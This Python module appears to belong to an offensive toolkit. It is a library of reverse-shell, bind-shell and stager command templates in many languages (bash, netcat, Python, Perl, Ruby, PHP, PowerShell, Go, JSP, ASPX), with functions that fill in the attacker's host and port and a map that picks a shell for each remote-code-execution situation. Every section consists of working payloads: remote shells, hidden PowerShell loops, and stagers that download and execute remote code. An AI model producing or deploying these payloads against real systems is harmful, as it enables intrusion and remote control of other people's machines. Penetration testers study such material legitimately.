"""
Reverse shell / bind shell / staged payload templates.

This is a library of strings, not a payload generator. Callers format
the template with {lhost} and {lport} and get back a command.

Templates are grouped:
  - REVERSE_TEMPLATES: connect back to us
  - BIND_TEMPLATES: listen on the target
  - STAGED_TEMPLATES: small stager that fetches a full stage

The legacy TEMPLATES dict is preserved as an alias of the "reverse"
subset, so existing callers keep working.

Nothing here is novel — every one-liner is either standard or a
variant of a standard. The value is having them all in one place
with consistent naming.
"""


# =====================================================================
# Reverse shells (connect back to the attacker)
# =====================================================================

REVERSE_TEMPLATES = {
    # --- Bash ---
    "bash":
        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "bash_exec":
        "bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport} <&1'",
    "bash_196":
        "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; "
        "sh <&196 >&196 2>&196",
    "bash_read":
        "exec 5<>/dev/tcp/{lhost}/{lport};"
        "cat <&5 | while read line; do $line 2>&5 >&5; done",
    "bash_udp":
        "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
    "bash_awk":
        "awk 'BEGIN {{s=\"/inet/tcp/0/{lhost}/{lport}\"; "
        "while(42){{do{{printf \"shell>\" |& s; "
        "s |& getline c; if(c){{while((c |& getline) > 0) "
        "print $0 |& s; close(c)}}}} while(c!=\"exit\")}}}}'",

    # --- Netcat ---
    "nc":
        "nc -e /bin/sh {lhost} {lport}",
    "nc_mkfifo":
        "rm /tmp/f;mkfifo /tmp/f;"
        "cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "nc_c":
        "nc {lhost} {lport} -c /bin/sh",
    "ncat":
        "ncat {lhost} {lport} -e /bin/sh",
    "ncat_ssl":
        "ncat --ssl {lhost} {lport} -e /bin/sh",

    # --- Python ---
    "python":
        ("python3 -c 'import socket,subprocess,os;"
         "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
         "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
         "subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "python_pty":
        ("python3 -c 'import socket,pty,os;"
         "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
         "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
         "pty.spawn(\"/bin/sh\")'"),
    "python2":
        ("python -c 'import socket,subprocess,os;"
         "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
         "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
         "subprocess.call([\"/bin/sh\",\"-i\"])'"),

    # --- Perl ---
    "perl":
        ("perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
         "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
         "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
         "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
         "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),

    # --- Ruby ---
    "ruby":
        ("ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
         "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),

    # --- PHP ---
    "php":
        ("php -r '$sock=fsockopen(\"{lhost}\",{lport});"
         "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "php_proc":
        ("php -r '$sock=fsockopen(\"{lhost}\",{lport});"
         "$proc=proc_open(\"/bin/sh -i\","
         "[0=>$sock,1=>$sock,2=>$sock],$pipes);'"),

    # --- PowerShell ---
    "powershell":
        ("powershell -nop -w hidden -c \""
         "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
         "$s=$c.GetStream();"
         "[byte[]]$b=0..65535|%{{0}};"
         "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
         "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
         "$r=(iex $d 2>&1|Out-String);"
         "$r2=$r+'PS '+(pwd).Path+'> ';"
         "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
         "$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\""),
    "powershell_b64":
        # Short stub: caller base64-encodes the full PS payload
        ("powershell -nop -w hidden -EncodedCommand {b64}"),
    "powershell_iex":
        ("powershell -nop -w hidden -c "
         "\"IEX(New-Object Net.WebClient)."
         "DownloadString('http://{lhost}:{lport}/a')\""),
    "powershell_tcp_sta":
        ("powershell -nop -w hidden -sta -c \""
         "$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
         "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
         "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
         "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
         "$r=(iex $d 2>&1|Out-String);"
         "$sb=([Text.Encoding]::ASCII).GetBytes($r);"
         "$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\""),

    # --- Go ---
    "go":
        # Emitted as a source file. Caller must compile it.
        ("package main\n"
         "import (\"net\";\"os/exec\")\n"
         "func main() {{"
         "c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");"
         "cmd:=exec.Command(\"/bin/sh\");"
         "cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;"
         "cmd.Run() }}"),

    # --- Java (JSP) ---
    "jsp":
        ("<%@ page import=\"java.util.*,java.io.*,java.net.*\"%>"
         "<% "
         "Process p=new ProcessBuilder(\"/bin/sh\").redirectErrorStream(true).start();"
         "Socket s=new Socket(\"{lhost}\",{lport});"
         "InputStream pi=p.getInputStream(),si=s.getInputStream();"
         "OutputStream po=p.getOutputStream(),so=s.getOutputStream();"
         "while(!s.isClosed()){{"
         "while(pi.available()>0)so.write(pi.read());"
         "while(si.available()>0)po.write(si.read());"
         "so.flush();po.flush();"
         "Thread.sleep(50);"
         "try{{p.exitValue();break;}}catch(Exception e){{}}}}"
         "p.destroy();s.close();%>"),

    # --- ASP / ASPX ---
    "aspx":
        ("<%@ Page Language=\"C#\" %>"
         "<%@ Import Namespace=\"System.Diagnostics\" %>"
         "<% "
         "Process p = new Process();"
         "p.StartInfo.FileName = \"cmd.exe\";"
         "p.StartInfo.Arguments = \"/c powershell -nop -w hidden -c "
         "\\\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
         "\\\"\";"
         "p.Start(); %>"),
}


# =====================================================================
# Bind shells (target listens, we connect in)
# =====================================================================

BIND_TEMPLATES = {
    "bash":
        "bash -i >& /dev/tcp/0.0.0.0/{lport} 0>&1",
    "nc":
        "nc -lvp {lport} -e /bin/sh",
    "nc_mkfifo":
        "rm /tmp/f;mkfifo /tmp/f;"
        "cat /tmp/f|/bin/sh -i 2>&1|nc -lvp {lport} >/tmp/f",
    "python":
        ("python3 -c 'import socket,subprocess,os;"
         "s=socket.socket();s.bind((\"0.0.0.0\",{lport}));"
         "s.listen(1);c,_=s.accept();"
         "[os.dup2(c.fileno(),f) for f in (0,1,2)];"
         "subprocess.call([\"/bin/sh\",\"-i\"])'"),
    "powershell":
        ("powershell -nop -w hidden -c \""
         "$l=New-Object Net.Sockets.TcpListener('0.0.0.0',{lport});"
         "$l.Start();$c=$l.AcceptTcpClient();"
         "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
         "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
         "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
         "$r=(iex $d 2>&1|Out-String);"
         "$sb=([Text.Encoding]::ASCII).GetBytes($r);"
         "$s.Write($sb,0,$sb.Length);$s.Flush()}}\""),
}


# =====================================================================
# Stagers (small payload that fetches a full stage)
# =====================================================================

STAGED_TEMPLATES = {
    # Stagers download a full payload from http://{lhost}:{lport}/{path}
    # The full stage is what the attacker serves at that path.

    "bash":
        "curl -s http://{lhost}:{lport}/{path} | bash",
    "bash_wget":
        "wget -qO- http://{lhost}:{lport}/{path} | bash",
    "python":
        ("python3 -c 'import urllib.request,os;"
         "exec(urllib.request.urlopen("
         "\"http://{lhost}:{lport}/{path}\").read())'"),
    "perl":
        ("perl -e 'use LWP::Simple;"
         "exec(get(\"http://{lhost}:{lport}/{path}\"))'"),
    "ruby":
        ("ruby -e 'require \"open-uri\";"
         "eval(URI.open(\"http://{lhost}:{lport}/{path}\").read)'"),
    "php":
        ("php -r '$c=file_get_contents("
         "\"http://{lhost}:{lport}/{path}\");eval($c);'"),
    "powershell":
        ("powershell -nop -w hidden -c "
         "\"IEX(New-Object Net.WebClient)."
         "DownloadString('http://{lhost}:{lport}/{path}')\""),
    "powershell_amsi":
        # Same as above; the AMSI bypass is in the stage, not the stager.
        # Keep both names so callers can pick.
        ("powershell -nop -w hidden -c "
         "\"IEX(New-Object Net.WebClient)."
         "DownloadString('http://{lhost}:{lport}/{path}')\""),
}


# =====================================================================
# Legacy alias: TEMPLATES == REVERSE_TEMPLATES
# =====================================================================

# Existing callers expect shells.TEMPLATES["bash"] to be a reverse
# shell. Keep that contract.
TEMPLATES = REVERSE_TEMPLATES


# =====================================================================
# Contexts (which shell to use for which situation)
# =====================================================================

CONTEXTS = {
    # --- Linux RCE ---
    "linux-rce":         "bash",
    "linux-rce-exec":    "bash_exec",
    "linux-rce-safe":    "python",       # /bin/bash is restricted
    "linux-rce-pty":     "python_pty",   # want a TTY
    "linux-rce-min":     "nc",           # minimal, nc -e required
    "linux-rce-mkfifo":  "nc_mkfifo",    # nc -e not available
    "linux-rce-udp":     "bash_udp",     # TCP is filtered
    "php-rce-linux":     "php",
    "perl-rce-linux":    "perl",
    "ruby-rce-linux":    "ruby",
    "jsp-rce":           "jsp",

    # --- Windows RCE ---
    "windows-rce":       "powershell",
    "windows-rce-sta":   "powershell_tcp_sta",
    "win-cmd-short":     "powershell",
    "aspx-rce":          "aspx",

    # --- Web-context neutral ---
    "php-web":           "php",

    # --- Staged ---
    "linux-staged":      "bash",          # use generate_stager()
    "windows-staged":    "powershell",
}


# =====================================================================
# Generation
# =====================================================================

def _format(template, lhost, lport, **extra):
    try:
        return template.format(lhost=lhost, lport=lport, **extra)
    except KeyError as e:
        # Template needs a field the caller didn't supply
        return None


def generate(shell_type, lhost, lport):
    """Return a reverse shell string, or None if the type is unknown."""
    tmpl = REVERSE_TEMPLATES.get(shell_type)
    if tmpl is None:
        return None
    return _format(tmpl, lhost, lport)


def generate_bind(shell_type, lport):
    """Return a bind shell string, or None."""
    tmpl = BIND_TEMPLATES.get(shell_type)
    if tmpl is None:
        return None
    return _format(tmpl, "0.0.0.0", lport)


def generate_stager(shell_type, lhost, lport, path="stage"):
    """Return a stager that fetches a full payload from our HTTP server.

    The caller is expected to serve the full stage at
    http://{lhost}:{lport}/{path} before the stager runs.
    """
    tmpl = STAGED_TEMPLATES.get(shell_type)
    if tmpl is None:
        return None
    return _format(tmpl, lhost, lport, path=path)


def generate_for_context(context, lhost, lport):
    """Given a context string, return (shell_type, payload) or (None, None)."""
    shell_type = CONTEXTS.get(context)
    if shell_type is None:
        return None, None
    return shell_type, generate(shell_type, lhost, lport)


def list_types():
    """Return all known reverse-shell type names, sorted."""
    return sorted(REVERSE_TEMPLATES.keys())


def list_contexts():
    """Return all known context names, sorted."""
    return sorted(CONTEXTS.keys())